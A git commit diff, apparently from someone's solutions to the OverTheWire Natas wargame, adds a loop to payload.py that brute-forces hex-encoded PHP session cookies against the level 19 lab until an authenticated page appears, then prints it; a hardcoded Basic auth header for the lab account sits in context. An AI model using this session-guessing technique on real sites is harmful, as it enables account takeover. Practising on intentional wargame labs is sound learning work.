2f554d13f401939702ddffb8319d763225fc1440
jesse mailhot <coshmeo@gmail.com>
2022-01-26 14:11:07 -0800

    trying the idea

--- 19/payload.py
+++ 19/payload.py
@@ -4,3 +4,10 @@ headers = {'Authorization': 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsa
 
 url = 'http://natas19.natas.labs.overthewire.org/index.php'
 
+for i in range(1, 641):
+    r = requests.post(url, headers=headers, cookies={'PHPSESSID':'{}-{}'.format(i, i).encode().hex()})
+    if 'next' in r.text: # the word next only appears in the response when you've successfully logged in
+        
+        soup = BeautifulSoup(r.text, 'html.parser')
+        print(soup.find(id='content'))
+        break
